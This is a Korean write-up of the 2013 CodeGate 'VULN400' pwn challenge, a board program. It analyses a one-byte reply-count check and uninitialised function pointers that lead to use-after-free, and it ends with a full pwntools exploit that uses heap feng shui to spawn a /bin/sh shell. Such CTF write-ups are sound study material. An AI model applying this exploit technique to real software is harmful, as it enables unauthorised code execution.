# [2013_CodeGate] \[PWN] VULN400

### 환경

```
[*] '/root/bob/E04/ass02'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



### 문제 파악

```
 _______________________________ 
/==============================/ 
|     Onetime Board Console    | 
/------------------------------/ 
|          | WELCOME |         | 
|__________|_________|_________| 
|          W  a  i   t         | 
++++++++++++++++++++++++++++++++ 
1. Write
2. Read
3. Exit
=>
```

게시물 작성, 읽기 , 삭제, 댓글 등의 기능이 있는 프로그램이다.

이상한 점은 게시물 생성시 댓글이 자동적으로 생성된다는 점, 하지만 댓글이 있는 게시물은 삭제가 안된다는 점이다. 

별 쓸모는 없지만 getchar() 뒤에 fflush()를 해주지 않아서 버그가 발생하기도 한다.



###취약점1 - Type Confusion

```c
int __cdecl delete_8048F82(post *a1)
{
  int result; // eax@2
  reply *i; // [sp+18h] [bp-10h]@4

  if ( SLOBYTE(a1->this) <= 0 )
  {
    *(_DWORD *)(a1->before + 4) = a1->next;
    *(_DWORD *)(a1->next + 8) = a1->before;
    if ( a1->field_28 == 0xDEADBEEF )
    {
      for ( i = (reply *)a1->reply; i->next; i = (reply *)i->next )
      {
        i->func1 = (int)sub_80487AC;
        i->func2 = (int)sub_80487C4;
      }
    }
    result = ((int (__cdecl *)(post *))a1->bbbb)(a1);
  }
  else
  {
    result = puts("Cannot Deleted. There's at least one or more replies on it");
  }
  return result;
}
```

첫번째 if문에서 값을 1바이트만 확인하는데 만약 댓글을 0xff+1개를 쓰게되면 값이 0x100이 되어 조건문을 만족시킬 수 있습니다.



 ### 취약점2 - UAF

취약점1의 소스코드에서 a1->bbbb에 있는 함수를 호출합니다. 

```c
void __cdecl sub_8048962(post *ptr)
{
  reply *v1; // [sp+14h] [bp-14h]@1
  signed int i; // [sp+18h] [bp-10h]@1

  v1 = ptr->reply;
  for ( i = 0; i <= 1; ++i )
  {
    if ( v1->func2 != sub_80487C4 )
    {
      puts("Detected");
      exit(1);
    }
    v1 = v1->next;
  }
  while ( v1->next )
  {
    (v1->func2)(v1->content);
    v1 = v1->next;
  }
  free(ptr->author);
  free(ptr->title);
  free(ptr->content);
  free(ptr);
}
```

함수 내용을 보면 while문 안에서 v1->func2의 함수를 호출합니다. 그런데 취약점1의 소스코드에서 (a1->field_28 == 0xDEADBEEF) 조건을 만족시키지 않으면 v1->func2가 초기화되지 않습니다. 이 조건은 게시물을 modify하게 되면 무력화됩니다.



### 시나리오

1. 게시물 3개 생성(#1,2,3)
2. 게시물에는 8000바이트의 내용을 넣을 수 있는데 \#2의 내용에 Heap Feng Shui를 만들어 둠.
3. \#2에 0xff개의 댓글 생성(첫번째 댓글은 게시물이 생성되면 자동적으로 생성됨)
4. \#2 삭제
5. 개시물 2개 생성(#4, #5)
6. \#4는 기존의 #2가 있던 힙 영역을 채울 것이며 #5는 Heap Feng Shui자리를 채우게 됨
7. \#4에 댓글을 0xff개 만큼 작성하고 게시물을 수정한 후, 삭제시키면 초기화되지 않은 함수가 호출됨. (Heap Feng Shui에 시스템 콜을 넣어놓으면 된다는 얘기)



### Exploit

```python
from pwn import *

def writePost(author,title,content):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline(author)
	p.recv()
	p.sendline(title)
	p.recv()
	p.sendline(content)

def writeReply(idx,content):
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(content)
	p.recv()
	p.sendline('4')

def modifyPost(idx,author,title):
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline(str(idx))
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline(author)
        p.recv()
        p.sendline(title)
        p.recv()
        p.sendline('4')

def deletePost(idx):
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline(str(idx))
        p.recv()
        p.sendline('1')
        p.recv()
        p.sendline('4')

p = process('./ass02')

writePost("1","1","1")
writePost("2","2",p32(0x080487C4)*1000+p32(0x08048630)*1000)
writePost("3","3","3")
for i in range(0xff):
	writeReply(2,str(i))
deletePost(2)
writePost("4","4","4")
writePost("5","5","5")
for i in range(0xff):
        writeReply(4,"/bin/sh")
modifyPost(4,"aa","bb")
deletePost(4)



p.interactive()
```

